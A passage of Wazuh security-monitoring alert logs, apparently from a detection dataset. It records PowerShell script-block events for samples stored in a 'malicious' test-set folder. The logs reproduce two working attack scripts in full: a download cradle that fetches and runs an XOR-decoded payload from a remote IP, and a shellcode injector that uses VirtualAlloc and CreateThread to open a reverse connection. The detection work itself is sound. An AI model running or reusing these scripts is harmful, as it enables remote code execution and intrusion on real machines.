SystEm.Net.WEbCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadeRs.Add('User-Agent',$u);$Wc.ProXY = [SysteM.NET.WebReQUest]::DeFaULTWeBPROXY;$wC.PrOXy.CreDENTialS = [SySteM.NEt.CreDeNtiaLCache]::DEfAulTNeTwoRkCREDEntiaLs;$K='5f4dcc3b5aa765d61d8327deb882cf99';$i=0;[CHAR[]]$b=([CHar[]]($WC.DOWNLoAdStRINg(\"http://52.28.242.165:8080/index.asp\")))|%{$_-bXor$k[$i++%$K.LeNgTh]};IEX ($B-joIN'')\r\n\r\nScriptBlock ID: b64961de-3bde-4195-8eb9-164e5d8061a5\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3721.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wc=NeW-OBJeCt SystEm.Net.WEbCLieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadeRs.Add('User-Agent',$u);$Wc.ProXY = [SysteM.NET.WebReQUest]::DeFaULTWeBPROXY;$wC.PrOXy.CreDENTialS = [SySteM.NEt.CreDeNtiaLCache]::DEfAulTNeTwoRkCREDEntiaLs;$K='5f4dcc3b5aa765d61d8327deb882cf99';$i=0;[CHAR[]]$b=([CHar[]]($WC.DOWNLoAdStRINg(\\\"http://52.28.242.165:8080/index.asp\\\")))|%{$_-bXor$k[$i++%$K.LeNgTh]};IEX ($B-joIN'')","scriptBlockId":"b64961de-3bde-4195-8eb9-164e5d8061a5","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3721.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:34.554+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":186,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304494.3935944","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:55.0693198Z","eventRecordID":"145761","processID":"8232","threadID":"7676","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x09,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 5e4212ee-0ac4-4422-be0d-068948f5f73e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\373.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x09,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"5e4212ee-0ac4-4422-be0d-068948f5f73e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\373.ps1"}}},"location":"EventChannel"}
